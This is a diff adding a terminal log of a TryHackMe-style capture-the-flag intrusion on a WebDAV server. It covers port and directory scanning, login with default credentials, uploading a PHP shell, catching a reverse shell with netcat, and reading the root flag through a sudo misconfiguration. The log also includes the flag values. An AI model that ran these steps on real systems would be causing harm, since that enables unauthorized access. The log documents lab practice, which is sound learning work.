@@ -1,0 +1,102 @@
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Dav]
+└─$ nmap -sC -sV -Pn 10.10.230.105 -oN nmap
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 13:59 EST
+Nmap scan report for 10.10.230.105
+Host is up (0.023s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
+                                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Dav]
+└─$ gobuster dir -u http://10.10.230.105/ -w /usr/share/dirb/wordlists/common.txt -o gobuster
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.230.105/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/06 14:01:38 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 292]
+/.htpasswd            (Status: 403) [Size: 297]
+/.htaccess            (Status: 403) [Size: 297]
+/index.html           (Status: 200) [Size: 11321]
+/server-status        (Status: 403) [Size: 301]  
+/webdav               (Status: 401) [Size: 460]  
+                                                 
+===============================================================
+2021/12/06 14:01:50 Finished
+===============================================================
+                                                                        
+# Default Credentials = wampp:xampp
+passwd.dav                                    
+wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Dav]
+└─$ curl -u "wampp:xampp" -X PUT http://10.10.230.105/webdav/test                                                                                                                                  3 ⨯
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>201 Created</title>
+</head><body>
+<h1>Created</h1>
+<p>Resource /webdav/test has been created.</p>
+<hr />
+<address>Apache/2.4.18 (Ubuntu) Server at 10.10.230.105 Port 80</address>
+</body></html>
+
+# Success we can upload files - Now, try cadaver
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Dav]
+└─$ cadaver http://10.10.230.105/webdav                          
+Authentication required for webdav on server `10.10.230.105':
+Username: wampp
+Password: 
+dav:/webdav/> put shell.php
+Uploading shell.php to `/webdav/shell.php':
+Progress: [=============================>] 100.0% of 78 bytes succeeded.
+dav:/webdav/> quit
+Connection to `10.10.230.105' closed.
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Dav]
+└─$ nc -lvnp 4444        
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.230.105.
+Ncat: Connection from 10.10.230.105:50636.
+Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 11:20:29 up 21 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /home  
+$ ls
+merlin
+wampp
+$ cd merlin
+$ ls
+user.txt
+$ cat user.txt
+449b40fe93f78a938523b7e4dcd66d2a
+$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+$ cat /root/root.txt
+cat: /root/root.txt: Permission denied
+$ sudo cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+$
